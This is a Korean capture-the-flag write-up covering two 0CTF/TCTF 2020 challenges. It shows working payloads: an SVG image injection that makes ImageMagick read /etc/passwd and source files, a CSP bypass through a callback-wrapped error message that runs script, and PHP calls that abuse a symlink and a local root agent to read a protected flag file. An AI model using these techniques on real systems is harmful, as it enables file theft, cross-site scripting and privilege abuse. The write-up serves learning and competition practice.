---
layout: post
title: "0CTF/TCTF 2020 - Wechat Generator, Cloud Computing v2"
author: "jeong.su"
comments: true
tags: [ctf, writeup, web, reversing]
---

라온화이트햇 핵심연구팀 최정수 ([jeon95u@gmail.com](mailto:jeon95u@gmail.com))


## 0CTF/TCTF 2020 Quals

> 2020.06.27 11:00 ~ 2020.06.29 11:00 KST (48 Hour)

## Wechat Generator

> Web
261 Pts
32 solved

Come and check my latest innovation! It's normal to encounter some bugs and glitches since it is still in beta development.
[http://pwnable.org:5000/](http://pwnable.org:5000/)

![/assets/jeong61.png](/assets/jeong61.png)

Wechat Generator 문제의 컨셉은 입력한 내용을 바탕으로 Fake Wechat 이미지를 생성해주는 서비스입니다.

메인 페이지에서는 크게 `Preview`와 `Share` 기능이 존재합니다.

`Preview` 기능의 경우 서버로 요청과 응답 패킷은 아래와 같습니다.

```
POST http://pwnable.org:5000/preview HTTP/1.1
Host: pwnable.org:5000
Connection: keep-alive
Content-Length: 122
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://pwnable.org:5000
Referer: http://pwnable.org:5000/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7

data=[{"type":0,"message":"Love you!"},{"type":1,"message":"Me too!!!"}]
```

```
HTTP/1.1 200 OK
Server: gunicorn/19.10.0
Date: Tue, 30 Jun 2020 06:38:45 GMT
Connection: close
Content-Type: application/json
Content-Length: 95404

{"previewid":"94e38e87-3554-4c0a-91c4-e31febc9c344","data":"data:image/svg+xml;base64,(Base64 Encoded SVG data)"}
```

대화 내용(data)을 넣고 요청하면 응답으로 `previewid`와 `data`를 받을 수 있습니다. `data`는 Base64로 인코딩된 이미지이며 새로운 대화 내용을 화면에 출력시켜줍니다.

![/assets/jeong62.png](/assets/jeong62.png)

`data`의 내용을 보면 `image/svg+xml`을 확인 할 수 있고 Base64로 인코딩된 이미지 파일을 디코딩을 하면  위와 같이 svg로 생성된 이미지인 것을 확인할 수 있습니다.

Wechat Generator는 이모티콘(이모지)도 지원을 합니다. 이모티콘을 사용했을때 패킷을 보면 아래와 같습니다.

```
POST http://pwnable.org:5000/preview HTTP/1.1
Host: pwnable.org:5000
Connection: keep-alive
Content-Length: 133
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://pwnable.org:5000
Referer: http://pwnable.org:5000/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7

data=[{"type":0,"message":"Love you!"},{"type":1,"message":"Me too!!![smile]!!!"}]
```

```
HTTP/1.1 200 OK
Server: gunicorn/19.10.0
Date: Tue, 30 Jun 2020 06:59:56 GMT
Connection: close
Content-Type: application/json
Content-Length: 95676

{"previewid":"412cf8f6-e141-41e9-bc95-dec8a01bc55d","data":"data:image/svg+xml;base64,(Base64 Encoded SVG data)"}
```

Requests의 `data`의 이모지는 `[smile]` text 들어가며 Response의 `data`를 디코딩 하여 살펴보면 `<image>`로 치환되어 들어가는 것을 확인할 수 있습니다.

```xml
<g transform="translate(273 572)">
    <text font-family="SimHei,SimHei" font-size="72">Me too!!!</text><image x="360" y="-60" height="100" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="http://pwnable.org:5000/static/emoji/smile.png" /><text x="460" font-family="SimHei,SimHei" font-size="72">!!!</text>
</g>
```

```
[smile] -> </text><image x="360" y="-60" height="100" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="http://pwnable.org:5000/static/emoji/smile.png" /><text x="460" font-family="SimHei,SimHei" font-size="72">
```

따라서 아래와 같은 요청으로 이미지를 임의로 삽입할 수 있습니다.

```
[{"type":0,"message":"[smile.png\"/><image xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"http://u1804.jeong.su:8888/\"/><test x=\"]"}]
```

단, 요청은 `preview` 기능이 아닌 `Share` 기능을 사용할때 `ImageMagick`에 의해 랜더링됩니다.

`Share` 기능은 `previewid`를 공유 URL로 만들어주는 기능입니다.

```
POST http://pwnable.org:5000/share HTTP/1.1
Host: pwnable.org:5000
Connection: keep-alive
Content-Length: 46
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://pwnable.org:5000
Referer: http://pwnable.org:5000/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7

previewid=f2bc983f-4ef5-4ade-89da-7e3ad321d626
```

```
HTTP/1.1 200 OK
Server: gunicorn/19.10.0
Date: Tue, 30 Jun 2020 07:47:27 GMT
Connection: close
Content-Type: application/json
Content-Length: 47

{"url": "http://pwnable.org:5000/share/tTVFUw"}
```

공유 URL을 접속하게 되면 `<img class="shareimg" src="/image/tTVFUw/png" id="preview"/>` 와 같이 이미지를 가져오며  `ImageMagick`에 의해 랜더링됩니다.

우리는 FLAG를 얻기 위해서 서버의 쉘을 획득하거나 파일을 읽을 수 있어야합니다.

이때 위에서 언급했던 이미지를 임의로 삽입 할 수 있는 취약점을 사용합니다.

```
[{"type":0,"message":"[smile.png\"/><image xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"http://u1804.jeong.su:8888/\"/><test x=\"]"}]
```

여러가지 Scheme을 사용하여 LFI를 시도한 결과, 아래와 같은 입력 값을 사용하여 로컬 파일을 읽어 올 수 있었습니다.

```
xlink:href="text:/etc/passwd"

[{"type":0,"message":"[smile.png\"/><image xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"text:/etc/passwd\"/><test x=\"]"}]
```

소스코드는 `/app/app.py` 경로에서 획득할 수 있었고 아래와 같이 이미지로 확인할 수 있습니다.

```
xlink:href="text:/app/app.py"

[{"type":0,"message":"[smile.png\"/><image xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"text:/app/app.py\"/><test x=\"]"}]
```

![/assets/jeong63.png](/assets/jeong63.png)

[http://pwnable.org:5000/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0ws](http://pwnable.org:5000/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0ws)

소스코드를 통해 Admin 기능의 URL을 발견할 수 있습니다.

접속을 하면 아래와 같은 메세지와 URL을 입력할 수 있는 Input Box가 나오게됩니다.

```
Submit URL that can alert(1) to admin.
He will give you whatever you want for reward :)
```

이제 문제가 XSS Challege, CSP Bypass Challege로 바뀌는 순간입니다.

사진을 보여주는 Share 기능을 살펴보면 뒤에 확장자가 존재하는 것을 확인 할 수 있습니다.

[http://pwnable.org:5000/image/RjtlqV/png](http://pwnable.org:5000/image/RjtlqV/png)

png의 값을 임의로 변경했을때 `{"error": "Wrong extension"}` 라는 리턴이 출력되는 것을 확인 할 수 있습니다. 확장자가 틀렸다는 메세지가 발생하므로 여러가지 확장자를 시도해봅니다.

여러가지 이미지 포맷의 확장자는 물론, `abc`, `txt`, `pdf`등의 확장자로 `ImageMagick`이 변환시켜줍니다. `exe` 확장자의 경우는 `{"error": "Convert exception: u'exe' is unsupported format"}`와 같은 에러가 발생했습니다. (유저의 인풋이 그대로 출력되는 상황입니다.)

XSS를 트리거하는게 목적이기 때문에 스크립트를 실행 할 수 있는 `html` 확장자도 시도해봤지만 `{"error": "Wrong extension"}` 메세지가 발생했고 결국 `htm` 확장자를 통해 사용자가 입력한 값을 그대로 출력해줍니다. Wechat 이미지를 생성할 때 생각해보면 `<image>` 태그를 넣었던 것처럼 `<script>` 태그를 삽입해주는 방법으로 스크립트를 실행 할 수 있습니다. 

 

여러 기능을 살펴보면서 CSP가 아래와 같이 특정 기능(서비스)에만 걸려있는 것을 확인할 수 있었습니다.

```
http://pwnable.org:5000/
http://pwnable.org:5000/share/tTVFUw
http://pwnable.org:5000/image/tTVFUw/png

Content-Security-Policy: img-src * data:; default-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self'; object-src 'none'; base-uri 'self'
```

`default-src 'self'` 때문에 같은 도메인에 js 파일을 업로드하는 방법으로 CSP를 우회 할 수 있겠다라는 생각이 들었습니다. 하지만 주어진 웹 서비스는 파일을 업로드하는 기능이 없습니다. 기능을 사용하면서 아래와 같은 사실을 알게 되었습니다.

`Share` 기능을 사용할 때 `previewid`로 존재하지 않는 값을 주게 되면 에러가 발생하게 됩니다.

```
POST http://pwnable.org:5000/share HTTP/1.1
Host: pwnable.org:5000
Connection: keep-alive
Content-Length: 14
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://pwnable.org:5000
Referer: http://pwnable.org:5000/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7

previewid=abcd
```

```
HTTP/1.1 200 OK
Server: gunicorn/19.10.0
Date: Tue, 30 Jun 2020 08:28:06 GMT
Connection: close
Content-Type: application/json
Content-Length: 47

{"url": "http://pwnable.org:5000/share/PfLqNp"}
```

```
GET http://pwnable.org:5000/image/PfLqNp/png HTTP/1.1
Host: pwnable.org:5000
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
```

```
HTTP/1.1 200 OK
Server: gunicorn/19.10.0
Date: Tue, 30 Jun 2020 08:29:19 GMT
Connection: close
Content-Type: application/json
Content-Length: 124
Content-Security-Policy: img-src * data:; default-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self'; object-src 'none'; base-uri 'self'

{"error": "Convert exception: unable to open image `previews/abcd': No such file or directory @ error/blob.c/OpenBlob/2874"}
```

따라서 `previewid`를 `"+alert(1)+"`로 하고 공유 기능을 사용함으로써 우리는 아래와 같은 JSON을 얻을 수 있습니다.

```
{"error": "Convert exception: unable to open image `previews/"+alert(1)+"': No such file or directory @ error/blob.c/OpenBlob/2874"}
```

위 JSON을 Javascript Console에서 사용하면 당연히 alert 메세지가 잘뜹니다. 하지만 script의 js 파일처럼 불러오게 되면 아래와 같은 에러가 발생합니다.

![/assets/jeong64.png](/assets/jeong64.png)

따라서 JSON 파일을 <script> 태그의 src로 바로 가져올 수 있는 방법을 검색하다보니 보통은 Callback Function을 통해 사용한다고 되어있습니다.

하지만 웹 서비스의 javascript를 전부 찾아보았지만 Callback 함수는 존재하지 않았고 반신반의 하며  아래와 같이 요청을 한 결과 callback 함수처럼 변환해주는 기능이 있는 것을 확인했습니다.

```
http://pwnable.org:5000/image/mZdWjn/png?callback=xxx

xxx={"error": "Convert exception: unable to open image `previews/"+alert(1)+"': No such file or directory @ error/blob.c/OpenBlob/2874"}
```

따라서 아래와 같은 스크립트 태그를 사용하여 CSP를 우회 할 수 있었습니다. 여기서 src 또한 공백으로 치환하기 때문에 srsrcc를 사용하여 우회했습니다.

```
<script srsrcc='/image/mZdWjn/png?callback=xxx'><script>
```

### alert을 실행했지만 FLAG 인증까지 한 시간이 더 소요된 이야기

FLAG를 주는 시크릿 페이지에서 alert(1)이 실행되는 URL을 제출 했지만 FLAG를 받을 수 없었고 더 열심히 하라는 내용이 출력됐습니다. 문제를 찾을 수 없어서 계속 스크립트도 바꿔보고 콘솔창에 발생하는 모든 에러를 지울 수 있도록 해봤지만 해결이 되지 않아서 IRC에 접속했습니다.

다행히도 친절한 ADMIN이 FLAG를 주는 봇은 외부에서 접속이 되지 않으며 BASE URL이 다를 수 있다는 이야기를 해줬습니다.

`<script srsrcc='http://pwnable.org:5000/image/mZdWjn/png?callback=xxx'><script>`

처음에는 위와 같이 BASE 서버 주소가 포함된 URL을 요청 했기 때문에 서버에서 alert(1)이 실행되지 않았기 때문에 한 시간이 넘는 시간이 이상한 삽질에 쓰이게 됐습니다. 다음부터는 꼭 인지해야할 것 같습니다^^

## Cloud Computing v2

> Misc (Web + Reversing)
275 Pts
18 solved

Cloud Computing v2 문제는 Cloud Computing 문제와는 다르게 flag가 루트 권한에서만 읽을 수 있게 되어 있습니다. 따라서 flag를 읽을 수 있는 다른 서비스가 있을 것이라고 생각을 했습니다.

Cloud Computing의 문제에서 open_basedir을 우회하여 루트 폴더를 보면 이상한 agent라는 바이너리가 존재하는 것을 알 수 있습니다.

agent 바이너리는 Echo라는 go 언어의 웹 프레임워크를 사용하여 작성되어 있습니다.

go 언어를 IDA로 분석하기 위해서 IDAPython 스크립트를 사용했습니다.

[https://github.com/strazzere/golang_loader_assist](https://github.com/strazzere/golang_loader_assist)

해당 스크립트의 최신 스크립트는 IDA Pro 7.4 이후 Python3 버전에서 동작하도록 만들어져있습니다.

따라서 IDA Pro 7.2를 사용하는 저는 이전 commit을 보고 과거 버전에서 동작하는 스크립트를 찾아 실행시켰습니다.

([https://raw.githubusercontent.com/strazzere/golang_loader_assist/fd6e598fd586b0fe07e66c0d309824d119a02630/golang_loader_assist.py](https://raw.githubusercontent.com/strazzere/golang_loader_assist/fd6e598fd586b0fe07e66c0d309824d119a02630/golang_loader_assist.py))

main_main 함수에서 `127.0.0.1:80`로 Echo 서버를 시작하는 것을 알 수 있으며 아래와 같이 라우팅 되는 것을 확인할 수 있습니다.

`/init` ⇒ `main_init`

`/read` ⇒ `main_read`

`/scan` ⇒ `main_scan`

3가지 End-Point는 모두 dir을 인자로 받으며 dir은 `^/var/www/html/sandbox/[0-9a-f]{40}/` 정규식 검사를 하게 됩니다.

`main_init` 함수는 주어진 dir에 `{"ban": "flag"}` 내용의 `config.json` 파일을 생성해주는 역할을 합니다.

`main_read` 함수는 주어진 dir에 `config.json` 파일을 읽어서 ban 내용을 확인하고 `target`인자로 넘어온 경로를 읽어주는 역할을 합니다. 읽은 내용은 Base64로 인코딩하여 출력해줍니다. 단 ban에 있는 내용중 한글자라도 일치하게 되면 파일을 읽어주지 않습니다.

`main_scan` 함수는 주어진 dir에 있는 `*.php` 파일들의 내용을 초기화 해주는 역할을 합니다.

따라서 아래와 같은 과정을 통해서 flag를 읽을 수 있습니다. 

```
echo file_get_contents("http://127.0.0.1/init?dir=/var/www/html/sandbox/c1023633f127ad0f5da7fdbee0e99c764d2d2e9b/");

symlink("/var/www/html/sandbox/c1023633f127ad0f5da7fdbee0e99c764d2d2e9b/config.json", "/var/www/html/sandbox/c1023633f127ad0f5da7fdbee0e99c764d2d2e9b/config.php");

echo file_get_contents("http://127.0.0.1/scan?dir=/var/www/html/sandbox/c1023633f127ad0f5da7fdbee0e99c764d2d2e9b/");

echo file_get_contents("http://127.0.0.1/read?dir=/var/www/html/sandbox/c1023633f127ad0f5da7fdbee0e99c764d2d2e9b/&target=/flag");

successsuccessfile contents:ZmxhZ3tkYzZhNzNhZjA1MmM2MTM1YjRjNjM1NmE0YWFmMGI1OH0K //flag{dc6a73af052c6135b4c6356a4aaf0b58}
```